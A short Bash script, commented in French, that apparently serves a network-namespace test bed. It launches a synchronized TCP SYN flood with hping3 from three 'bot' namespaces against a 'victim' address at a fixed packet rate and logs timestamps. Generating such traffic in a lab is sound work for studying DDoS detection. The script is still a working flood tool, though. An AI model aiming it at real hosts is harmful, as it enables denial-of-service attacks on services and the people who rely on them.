#!/bin/bash

# Script de génération de trafic à débit constant (TCP SYN)
# Affiche le timestamp UNIX de début et de fin, et toutes les 30 s le temps écoulé.

# Paramètres
VICTIM_NS="victim"
VICTIM_IP="10.0.0.1"
BOT_COUNT=3
BASE_BOT_NS="bot"
TARGET_PORT=80
TEST_DURATION=180  # Durée en secondes
RATE=1000      # Paquets par seconde par bot
REPORT_INTERVAL=30 # Intervalle d'affichage du temps écoulé

# Couleurs console
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
RED='\033[0;31m'
NC='\033[0m'

# Vérification des dépendances
for cmd in ip hping3 date; do
    if ! command -v "$cmd" &>/dev/null; then
        echo -e "${RED}[!] Erreur : $cmd est requis.${NC}"
        exit 1
    fi
done

# Nettoyage à la fin
cleanup() {
    echo -e "${YELLOW}[*] Nettoyage final...${NC}"
    # tuer les bots
    for pid in "${PIDS[@]}"; do
        kill "$pid" 2>/dev/null
    done
    # tuer le reporter
    [[ -n "$REPORTER_PID" ]] && kill "$REPORTER_PID" 2>/dev/null
    # afficher le timestamp de fin
    END_TS=$(date +%s)
    echo -e "${GREEN}[✓] Test terminé.${NC}"
    echo -e "${GREEN}Timestamp début : ${START_TS}${NC}"
    echo -e "${GREEN}Timestamp fin   : ${END_TS}${NC}"
    exit 0
}
trap cleanup SIGINT SIGTERM

# Calculs
TOTAL_RATE=$((BOT_COUNT * RATE))
TOTAL_PKTS=$((RATE * TEST_DURATION))        # Par bot
INTERVAL_US=$((1000000 / RATE))             # Microsecondes entre paquets

# Timestamp de début
START_TS=$(date +%s)
echo -e "${YELLOW}[*] Début du test à $(date -d "@${START_TS}" '+%Y-%m-%d %H:%M:%S') (timestamp ${START_TS}) pour ${TEST_DURATION}s${NC}"
echo -e "${GREEN}[*] Envoi à $TOTAL_RATE pps total (${BOT_COUNT} bots à $RATE pps)${NC}"

# Lancement de l’attaque
PIDS=()
for i in $(seq 1 $BOT_COUNT); do
    NS="${BASE_BOT_NS}${i}"
    echo -e "${YELLOW}[*] Lancement de hping3 dans namespace $NS...${NC}"
    ip netns exec "$NS" hping3 -S -p "$TARGET_PORT" \
        --count "$TOTAL_PKTS" \
        --interval "u${INTERVAL_US}" "$VICTIM_IP" \
        > /dev/null 2>&1 &
    PIDS+=($!)
done

# Reporter le temps écoulé toutes les REPORT_INTERVAL secondes
(
    while true; do
        sleep "$REPORT_INTERVAL"
        NOW=$(date +%s)
        ELAPSED=$((NOW - START_TS))
        echo -e "${YELLOW}[i] Temps écoulé : ${ELAPSED}s${NC}"
    done
) &
REPORTER_PID=$!

# Attente de la fin du test puis cleanup
sleep "$TEST_DURATION"
cleanup
